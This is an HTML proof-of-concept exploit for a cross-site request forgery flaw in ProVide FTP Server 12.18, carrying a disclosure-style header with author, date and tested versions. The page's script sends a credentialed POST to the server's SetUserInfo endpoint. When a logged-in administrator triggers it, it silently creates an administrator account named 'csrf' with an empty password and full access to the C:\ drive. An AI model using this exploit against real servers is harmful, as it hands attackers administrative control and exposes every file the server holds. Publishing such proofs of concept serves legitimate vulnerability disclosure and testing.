<html>
<!-- 
# Vulnerability Title: ProVide FTP Server - Admin Create CSRF (PoC)
# Author: Alessandro Magnosi (d3adc0de)
# Date: (DD/MM/YYYY) - 06/04/2020
# Vendor Homepage: https://www.provideserver.com/
# Software Link : https://download.provideserver.com/ProVide_Setup.exe
# Tested Version: 12.18
# Vulnerability Type: Admin User Creation via CSRF
# Tested on OS: Windows 7, Windows 10
# Exploit designed for: ProVide FTP Server
-->
 <html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https:\/\/provide.ftp.local:8443\/ajax\/SetUserInfo", true);
        xhr.setRequestHeader("Accept", "application\/json, text\/javascript, *\/*; q=0.01");
        xhr.setRequestHeader("Accept-Language", "it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded; charset=UTF-8");
        xhr.withCredentials = true;
        var body = "general=%7B%22OldUserName%22%3A%22%22%2C%22RealName%22%3A%22csrf%22%2C%22Password%22%3A%22%22%2C%22Administrator%22%3Atrue%2C%22UserName%22%3A%22csrf%22%2C%22GroupMembership%22%3A%22%22%7D&restrictions=%7B%22UserOverrideUTF8%22%3A%22%22%2C%22MaxBytesPerSecULUnit%22%3A1%2C%22MaxSimultaneousULEnabled%22%3Afalse%2C%22MaxBytesPerSecULEnabled%22%3Afalse%2C%22OverrideConcurrentLoginSettings%22%3Afalse%2C%22UserOverrideLoginLimit%22%3Afalse%2C%22MaxSimultaneousLoginPerIP%22%3A0%2C%22OverrideSpeedLimitSettings%22%3Afalse%2C%22OverrideTransferLimitSettings%22%3Afalse%2C%22MaxBytesPerSecDLUnit%22%3A1%2C%22CachePassword%22%3Afalse%2C%22MaxSimultaneousLoginPerIPEnabled%22%3Afalse%2C%22ExpireRemoveEnabled%22%3Afalse%2C%22ExpireType%22%3A0%2C%22ExpireDate%22%3A%222020-04-09%22%2C%22VirtualAccount%22%3Afalse%2C%22MaxSimultaneousUL%22%3A0%2C%22MaxSimultaneousDL%22%3A0%2C%22MaxSimultaneousLogin%22%3A0%2C%22MaxSimultaneousLoginEnabled%22%3Afalse%2C%22ExpireEnabled%22%3Afalse%2C%22UserOverrideGlobalSpeedLimit%22%3Afalse%2C%22WindowsAccount%22%3Afalse%2C%22ExpireValue%22%3A0%2C%22OverrideUTF8%22%3Afalse%2C%22AccountDisabled%22%3Afalse%2C%22OverrideExpirationSettings%22%3Afalse%2C%22MaxBytesPerSecUL%22%3A0%2C%22MaxBytesPerSecDL%22%3A0%2C%22MaxSimultaneousDLEnabled%22%3Afalse%2C%22MaxBytesPerSecDLEnabled%22%3Afalse%2C%22AllowAnonymousAccess%22%3Afalse%2C%22IgnoreSpeedLimitOnLocalNetwork%22%3Afalse%7D&security=%7B%22AccessAllowList%22%3A%22%22%2C%22RequirePubKey%22%3Afalse%2C%22OverridePubKeySettings%22%3Afalse%2C%22AccessDenyList%22%3A%22%22%2C%22PubKey%22%3A%22%22%2C%22SpecifyAccessDenyList%22%3Afalse%2C%22OverrideAccessSettings%22%3Afalse%2C%22SpecifyAccessAllowList%22%3Afalse%2C%22AllowPubKey%22%3Afalse%2C%22RequirePasswordIfNoPubKey%22%3Afalse%7D&services=%7B%22AllowProVideLink%22%3Afalse%2C%22OverrideFTP%22%3Afalse%2C%22AllowTFTP%22%3Afalse%2C%22AllowSFTP%22%3Atrue%2C%22AllowFTPS%22%3Afalse%2C%22RequirePasswordReceive%22%3Afalse%2C%22RequirePasswordShare%22%3Afalse%2C%22RequirePasswordCollaborate%22%3Afalse%2C%22AllowFTP%22%3Atrue%2C%22AllowHTTPS%22%3Atrue%2C%22AllowCollaborate%22%3Afalse%2C%22OverrideHTTPS%22%3Afalse%2C%22AllowShare%22%3Afalse%2C%22OverrideTFTP%22%3Afalse%2C%22OverrideSFTP%22%3Afalse%2C%22OverrideFTPS%22%3Afalse%2C%22AllowManageFavorites%22%3Atrue%2C%22AllowReceive%22%3Afalse%7D&messages=%7B%22MsgOnCreateDirectory%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Requested+file+action+okay%2C+completed.%22%7D%2C%22MsgOnUploadStart%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22File+status+okay%3B+about+to+open+data+connection.%22%7D%2C%22MsgOnUploadEnd%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Closing+data+connection.%22%7D%2C%22MsgOnDownloadEnd%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Closing+data+connection.%22%7D%2C%22MsgOnRemoveDirectory%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Requested+file+action+okay%2C+completed.%22%7D%2C%22MsgBeforeCreateDirectory%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgBeforeRename%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgBeforeRemoveDirectory%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgOnQuit%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Goodbye.%22%7D%2C%22MsgOnCopy%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Requested+file+action+okay%2C+completed.%22%7D%2C%22MsgOnDownloadStart%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22File+status+okay%3B+about+to+open+data+connection.%22%7D%2C%22MsgBeforeUpload%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgOnListDirectoryEnd%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Closing+data+connection.%22%7D%2C%22MsgBeforeLoggedIn%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Login+not+accepted%22%7D%2C%22MsgOnRename%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Requested+file+action+okay%2C+completed.%22%7D%2C%22MsgBeforeConnect%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22%22%7D%2C%22MsgBeforeDownload%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgOnChangeDirectory%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22CWD+Command+successful.%22%7D%2C%22MsgOnConnect%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22%25SW_NAME%25+v%25SW_VERSION%25%2C+build+%25SW_BUILD%25+ready.%22%7D%2C%22MsgOnListDirectoryStart%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Opening+connection+for+%2Fbin%2Fls.%22%7D%2C%22MsgBeforeRemoveFile%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgBeforeChangeDirectory%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgOnDisconnect%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22%22%7D%2C%22MsgOnRemoveFile%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Requested+file+action+okay%2C+completed.%22%7D%2C%22MsgBeforeCopy%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgBeforeListDirectory%22%3A%7B%22ShowScript%22%3Atrue%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22Access+denied%22%7D%2C%22MsgOnLoggedIn%22%3A%7B%22ShowScript%22%3Afalse%2C%22Enabled%22%3Afalse%2C%22Script%22%3A%22%22%2C%22Text%22%3A%22User+logged+in%2C+proceed.%22%7D%7D&directories=%5B%22%2F%7CC%3A%5C%5C%7C%2CRF%2CLD%2CRR%2CAF%2CDF%2CWF%2CDD%2CMD%22%5D&statistics=%7B%22DownloadsFailed%22%3A0%2C%22BytesDownloaded%22%3A0%2C%22ClearGeneral%22%3Afalse%2C%22ClearDownloads%22%3Afalse%2C%22CreationDate%22%3A%22%3CUnknown%3E%22%2C%22FilesUploaded%22%3A0%2C%22LastKnownIP%22%3A%22%3CUnknown%3E%22%2C%22LastLogin%22%3A%22%3CUnknown%3E%22%2C%22ClearUploads%22%3Afalse%2C%22BytesUploaded%22%3A0%2C%22FilesDownloaded%22%3A0%2C%22UploadsFailed%22%3A0%2C%22Logins%22%3A0%7D";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i); 
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

